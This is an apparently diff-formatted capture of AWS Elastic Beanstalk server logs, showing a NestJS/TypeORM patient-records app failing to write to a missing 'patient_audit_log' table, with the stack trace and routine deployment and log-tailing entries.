+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: START TRANSACTION
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: INSERT INTO "patient_audit_log"("id", "patient_id", "tenant_id", "user_id", "user_name", "action", "changed_fields", "payload_snapshot", "created_at") VALUES (DEFAULT, $1, $2, $3, $4, $5, DEFAULT, $6, DEFAULT) RETURNING "id", "created_at" -- PARAMETERS: ["767d2ee8-e07e-4d10-a416-39b78bcb27e7","mi_consultorio_dent_hce","8a3a9fef-b10b-4d7a-ae76-bcc418059712","Desconocido","CREATE","{\"resourceType\":\"Patient\",\"active\":true,\"identifier\":[{\"use\":\"official\",\"type\":{\"coding\":[{\"system\":\"http://terminology.hl7.org/CodeSystem/v2-0203\",\"code\":\"NNARG\",\"display\":\"National Person Identifier\"}]},\"system\":\"http://hospital.gov/dni\",\"value\":\"98989\"}],\"name\":[{\"use\":\"official\",\"family\":\"cesar\",\"given\":[\"julio\"]}],\"gender\":\"male\",\"birthDate\":\"2002-12-12\",\"telecom\":[{\"system\":\"phone\",\"value\":\"6523\",\"use\":\"home\"},{\"system\":\"email\",\"value\":\"julio@gmail.com\",\"use\":\"home\"}],\"address\":[{\"use\":\"home\",\"type\":\"both\",\"line\":[\"lkjhj\"],\"city\":\"hjhkj\",\"country\":\"Argentina\"}],\"extension\":[{\"url\":\"http://hospital.gov/fhir/StructureDefinition/admission-date\",\"valueDateTime\":\"2026-05-29T13:37:43.063Z\"}],\"id\":\"767d2ee8-e07e-4d10-a416-39b78bcb27e7\"}"]
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query failed: INSERT INTO "patient_audit_log"("id", "patient_id", "tenant_id", "user_id", "user_name", "action", "changed_fields", "payload_snapshot", "created_at") VALUES (DEFAULT, $1, $2, $3, $4, $5, DEFAULT, $6, DEFAULT) RETURNING "id", "created_at" -- PARAMETERS: ["767d2ee8-e07e-4d10-a416-39b78bcb27e7","mi_consultorio_dent_hce","8a3a9fef-b10b-4d7a-ae76-bcc418059712","Desconocido","CREATE","{\"resourceType\":\"Patient\",\"active\":true,\"identifier\":[{\"use\":\"official\",\"type\":{\"coding\":[{\"system\":\"http://terminology.hl7.org/CodeSystem/v2-0203\",\"code\":\"NNARG\",\"display\":\"National Person Identifier\"}]},\"system\":\"http://hospital.gov/dni\",\"value\":\"98989\"}],\"name\":[{\"use\":\"official\",\"family\":\"cesar\",\"given\":[\"julio\"]}],\"gender\":\"male\",\"birthDate\":\"2002-12-12\",\"telecom\":[{\"system\":\"phone\",\"value\":\"6523\",\"use\":\"home\"},{\"system\":\"email\",\"value\":\"julio@gmail.com\",\"use\":\"home\"}],\"address\":[{\"use\":\"home\",\"type\":\"both\",\"line\":[\"lkjhj\"],\"city\":\"hjhkj\",\"country\":\"Argentina\"}],\"extension\":[{\"url\":\"http://hospital.gov/fhir/StructureDefinition/admission-date\",\"valueDateTime\":\"2026-05-29T13:37:43.063Z\"}],\"id\":\"767d2ee8-e07e-4d10-a416-39b78bcb27e7\"}"]
+May 29 13:37:43 ip-172-31-22-190 web[47021]: error: error: relation "patient_audit_log" does not exist
+May 29 13:37:43 ip-172-31-22-190 web[47021]: query: ROLLBACK
+May 29 13:37:43 ip-172-31-22-190 web[47021]: #033[31m[Nest] 47021  - #033[39m05/29/2026, 1:37:43 PM #033[31m  ERROR#033[39m #033[38;5;3m[ExceptionsHandler] #033[39mQueryFailedError: relation "patient_audit_log" does not exist
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at PostgresQueryRunner.query #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/driver/postgres/PostgresQueryRunner.js:231:19#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]: #033[90m    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async InsertQueryBuilder.execute #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/query-builder/InsertQueryBuilder.js:107:33#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async SubjectExecutor.executeInsertOperations #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/persistence/SubjectExecutor.js:260:42#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async SubjectExecutor.execute #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/persistence/SubjectExecutor.js:92:9#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async EntityPersistExecutor.execute #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/persistence/EntityPersistExecutor.js:150:21#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async PatientAuditService.logChange #033[90m(/var/app/current/#033[39mdist/patient/patient-audit.service.js:45:9#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async PatientService.create #033[90m(/var/app/current/#033[39mdist/patient/patient.service.js:73:9#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async #033[90m/var/app/current/#033[39mnode_modules/#033[4m@nestjs/core#033[24m/router/router-execution-context.js:46:28
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    at async #033[90m/var/app/current/#033[39mnode_modules/#033[4m@nestjs/core#033[24m/router/router-proxy.js:9:17 {
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  query: #033[32m'INSERT INTO "patient_audit_log"("id", "patient_id", "tenant_id", "user_id", "user_name", "action", "changed_fields", "payload_snapshot", "created_at") VALUES (DEFAULT, $1, $2, $3, $4, $5, DEFAULT, $6, DEFAULT) RETURNING "id", "created_at"'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  parameters: [
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    #033[32m'767d2ee8-e07e-4d10-a416-39b78bcb27e7'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    #033[32m'mi_consultorio_dent_hce'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    #033[32m'8a3a9fef-b10b-4d7a-ae76-bcc418059712'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    #033[32m'Desconocido'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    #033[32m'CREATE'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    #033[32m'{"resourceType":"Patient","active":true,"identifier":[{"use":"official","type":{"coding":[{"system":"http://terminology.hl7.org/CodeSystem/v2-0203","code":"NNARG","display":"National Person Identifier"}]},"system":"http://hospital.gov/dni","value":"98989"}],"name":[{"use":"official","family":"cesar","given":["julio"]}],"gender":"male","birthDate":"2002-12-12","telecom":[{"system":"phone","value":"6523","use":"home"},{"system":"email","value":"julio@gmail.com","use":"home"}],"address":[{"use":"home","type":"both","line":["lkjhj"],"city":"hjhkj","country":"Argentina"}],"extension":[{"url":"http://hospital.gov/fhir/StructureDefinition/admission-date","valueDateTime":"2026-05-29T13:37:43.063Z"}],"id":"767d2ee8-e07e-4d10-a416-39b78bcb27e7"}'#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  ],
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  driverError: error: relation "patient_audit_log" does not exist
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at #033[90m/var/app/current/#033[39mnode_modules/#033[4mpg#033[24m/lib/client.js:646:17
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  #033[90m    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async PostgresQueryRunner.query #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/driver/postgres/PostgresQueryRunner.js:196:25#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async InsertQueryBuilder.execute #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/query-builder/InsertQueryBuilder.js:107:33#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async SubjectExecutor.executeInsertOperations #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/persistence/SubjectExecutor.js:260:42#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async SubjectExecutor.execute #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/persistence/SubjectExecutor.js:92:9#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async EntityPersistExecutor.execute #033[90m(/var/app/current/#033[39mnode_modules/#033[4mtypeorm#033[24m/persistence/EntityPersistExecutor.js:150:21#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async PatientAuditService.logChange #033[90m(/var/app/current/#033[39mdist/patient/patient-audit.service.js:45:9#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async PatientService.create #033[90m(/var/app/current/#033[39mdist/patient/patient.service.js:73:9#033[90m)#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:      at async #033[90m/var/app/current/#033[39mnode_modules/#033[4m@nestjs/core#033[24m/router/router-execution-context.js:46:28 {
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    length: #033[33m116#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    severity: #033[32m'ERROR'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    code: #033[32m'42P01'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    detail: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    hint: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    position: #033[32m'13'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    internalPosition: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    internalQuery: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    where: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    schema: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    table: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    column: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    dataType: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    constraint: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    file: #033[32m'parse_relation.c'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    line: #033[32m'1466'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:    routine: #033[32m'parserOpenTable'#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  },
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  length: #033[33m116#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  severity: #033[32m'ERROR'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  code: #033[32m'42P01'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  detail: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  hint: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  position: #033[32m'13'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  internalPosition: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  internalQuery: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  where: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  schema: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  table: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  column: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  dataType: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  constraint: #033[90mundefined#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  file: #033[32m'parse_relation.c'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  line: #033[32m'1466'#033[39m,
+May 29 13:37:43 ip-172-31-22-190 web[47021]:  routine: #033[32m'parserOpenTable'#033[39m
+May 29 13:37:43 ip-172-31-22-190 web[47021]: }
+
+
+----------------------------------------
+/var/log/eb-engine.log
+----------------------------------------
+2026/05/29 13:33:41.782216 [INFO] Running command: systemctl show -p PartOf web.service
+2026/05/29 13:33:41.830113 [INFO] Running command: systemctl is-active web.service
+2026/05/29 13:33:41.838006 [INFO] Running command: systemctl disable web.service
+2026/05/29 13:33:42.087577 [INFO] Removed "/etc/systemd/system/multi-user.target.wants/web.service".
+
+2026/05/29 13:33:42.088188 [INFO] Running command: systemctl daemon-reload
+2026/05/29 13:33:42.338965 [INFO] Running command: systemctl reset-failed
+2026/05/29 13:33:42.347532 [INFO] Running command: systemctl is-active web.service
+2026/05/29 13:33:42.354776 [INFO] Process web has been fully terminated
+2026/05/29 13:33:42.354790 [INFO] All processes have been fully terminated
+2026/05/29 13:33:42.354795 [INFO] Removing /var/app/current/ if it exists
+2026/05/29 13:33:42.591120 [INFO] Renaming /var/app/staging/ to /var/app/current/
+2026/05/29 13:33:42.591192 [INFO] Register application processes...
+2026/05/29 13:33:42.591201 [INFO] Registering the proc: web
+
+2026/05/29 13:33:42.591214 [INFO] Running command: systemctl show -p PartOf web.service
+2026/05/29 13:33:42.633402 [INFO] Running command: systemctl daemon-reload
+2026/05/29 13:33:42.875601 [INFO] Running command: systemctl reset-failed
+2026/05/29 13:33:42.884212 [INFO] Running command: systemctl is-enabled eb-app.target
+2026/05/29 13:33:42.891694 [INFO] Running command: systemctl enable eb-app.target
+2026/05/29 13:33:43.159810 [INFO] Running command: systemctl start eb-app.target
+2026/05/29 13:33:43.168988 [INFO] Running command: systemctl enable web.service
+2026/05/29 13:33:43.399205 [INFO] Created symlink /etc/systemd/system/multi-user.target.wants/web.service â†’ /etc/systemd/system/web.service.
+
+2026/05/29 13:33:43.399237 [INFO] Running command: systemctl show -p PartOf web.service
+2026/05/29 13:33:43.410224 [INFO] Running command: systemctl is-active web.service
+2026/05/29 13:33:43.417404 [INFO] Running command: systemctl start web.service
+2026/05/29 13:33:45.481196 [INFO] Executing instruction: start X-Ray
+2026/05/29 13:33:45.481205 [INFO] X-Ray is not enabled.
+2026/05/29 13:33:45.481210 [INFO] Executing instruction: start proxy with new configuration
+2026/05/29 13:33:45.481233 [INFO] Running command: /usr/sbin/nginx -t -c /var/proxy/staging/nginx/nginx.conf
+2026/05/29 13:33:45.499665 [INFO] nginx: [warn] could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+nginx: the configuration file /var/proxy/staging/nginx/nginx.conf syntax is ok
+nginx: configuration file /var/proxy/staging/nginx/nginx.conf test is successful
+
+2026/05/29 13:33:45.499935 [INFO] Running command: cp -rp /var/proxy/staging/nginx/* /etc/nginx
+2026/05/29 13:33:45.502903 [INFO] Running command: systemctl show -p PartOf nginx.service
+2026/05/29 13:33:45.520070 [INFO] Running command: systemctl daemon-reload
+2026/05/29 13:33:45.737776 [INFO] Running command: systemctl reset-failed
+2026/05/29 13:33:45.746004 [INFO] Running command: systemctl show -p PartOf nginx.service
+2026/05/29 13:33:45.759075 [INFO] Running command: systemctl is-active nginx.service
+2026/05/29 13:33:45.768217 [INFO] Running command: systemctl start nginx.service
+2026/05/29 13:33:45.862598 [INFO] Executing instruction: configureSqsd
+2026/05/29 13:33:45.862619 [INFO] This is a web server environment instance, skip configure sqsd daemon ...
+2026/05/29 13:33:45.862623 [INFO] Executing instruction: startSqsd
+2026/05/29 13:33:45.862626 [INFO] This is a web server environment instance, skip start sqsd daemon ...
+2026/05/29 13:33:45.862630 [INFO] Executing instruction: Track pids in healthd
+2026/05/29 13:33:45.862634 [INFO] This is an enhanced health env...
+2026/05/29 13:33:45.862647 [INFO] Running command: systemctl show -p ConsistsOf aws-eb.target | cut -d= -f2
+2026/05/29 13:33:45.872950 [INFO] cfn-hup.service nginx.service healthd.service
+
+2026/05/29 13:33:45.872985 [INFO] Running command: systemctl show -p ConsistsOf eb-app.target | cut -d= -f2
+2026/05/29 13:33:45.883118 [INFO] web.service
+
+2026/05/29 13:33:45.883354 [INFO] Executing instruction: RunConfigDeployPostDeployHooks
+2026/05/29 13:33:45.883364 [INFO] No hooks found in .platform/confighooks/postdeploy/, skipping
+2026/05/29 13:33:45.883367 [INFO] Executing cleanup logic
+2026/05/29 13:33:45.883448 [INFO] CommandService Response: {"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"Engine execution has succeeded.","returncode":0,"events":[{"msg":"Instance deployment completed successfully.","timestamp":1780061625883,"severity":"INFO"}]}]}
+
+2026/05/29 13:33:45.915274 [INFO] Platform Engine finished execution on command: config-deploy
+
+2026/05/29 13:38:30.806663 [INFO] Starting...
+2026/05/29 13:38:30.806713 [INFO] Starting EBPlatform-PlatformEngine
+2026/05/29 13:38:30.806752 [INFO] reading event message file
+2026/05/29 13:38:30.807116 [INFO] Engine received EB command cfn-hup-exec
+
+2026/05/29 13:38:30.877486 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-east-1:751835847253:stack/awseb-e-cqtn7sixmr-stack/c72c6510-5ab2-11f1-98aa-0e4d40153481 -r AWSEBAutoScalingGroup --region us-east-1
+2026/05/29 13:38:31.109954 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-east-1:751835847253:stack/awseb-e-cqtn7sixmr-stack/c72c6510-5ab2-11f1-98aa-0e4d40153481 -r AWSEBBeanstalkMetadata --region us-east-1
+2026/05/29 13:38:31.346052 [INFO] checking whether command tail-log is applicable to this instance...
+2026/05/29 13:38:31.346068 [INFO] this command is applicable to the instance, thus instance should execute command
+2026/05/29 13:38:31.346072 [INFO] Engine command: (tail-log)
+
+2026/05/29 13:38:31.346131 [INFO] Executing instruction: GetTailLogs
+2026/05/29 13:38:31.346135 [INFO] Tail Logs...
+2026/05/29 13:38:31.346618 [INFO] Running command: tail -n 100 /var/log/eb-engine.log
+2026/05/29 13:38:31.348919 [INFO] Running command: tail -n 100 /var/log/nginx/access.log
+2026/05/29 13:38:31.352161 [INFO] Running command: tail -n 100 /var/log/nginx/error.log
+2026/05/29 13:38:31.356838 [INFO] Running command: tail -n 100 /var/log/web.stdout.log
+2026/05/29 13:38:31.425932 [INFO] Executing cleanup logic
+2026/05/29 13:38:31.426023 [INFO] CommandService Response: {"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"Engine execution has succeeded.","returncode":0,"events":[{"msg":"Instance deployment completed successfully.","timestamp":1780061911425,"severity":"INFO"}]}]}
+
+2026/05/29 13:38:31.426041 [INFO] Platform Engine finished execution on command: tail-log
+
+2026/05/29 14:01:16.851518 [INFO] Starting...
+2026/05/29 14:01:16.851570 [INFO] Starting EBPlatform-PlatformEngine
+2026/05/29 14:01:16.851619 [INFO] reading event message file
+2026/05/29 14:01:16.851981 [INFO] Engine received EB command cfn-hup-exec
+
+2026/05/29 14:01:16.993505 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-east-1:751835847253:stack/awseb-e-cqtn7sixmr-stack/c72c6510-5ab2-11f1-98aa-0e4d40153481 -r AWSEBAutoScalingGroup --region us-east-1
+2026/05/29 14:01:17.223667 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-east-1:751835847253:stack/awseb-e-cqtn7sixmr-stack/c72c6510-5ab2-11f1-98aa-0e4d40153481 -r AWSEBBeanstalkMetadata --region us-east-1
+2026/05/29 14:01:17.477211 [INFO] checking whether command tail-log is applicable to this instance...
+2026/05/29 14:01:17.477226 [INFO] this command is applicable to the instance, thus instance should execute command
+2026/05/29 14:01:17.477232 [INFO] Engine command: (tail-log)
+
+2026/05/29 14:01:17.477289 [INFO] Executing instruction: GetTailLogs
+2026/05/29 14:01:17.477293 [INFO] Tail Logs...
+2026/05/29 14:01:17.477799 [INFO] Running command: tail -n 100 /var/log/nginx/access.log
+2026/05/29 14:01:17.480020 [INFO] Running command: tail -n 100 /var/log/nginx/error.log
+2026/05/29 14:01:17.482009 [INFO] Running command: tail -n 100 /var/log/web.stdout.log
+2026/05/29 14:01:17.483759 [INFO] Running command: tail -n 100 /var/log/eb-engine.log
+
+
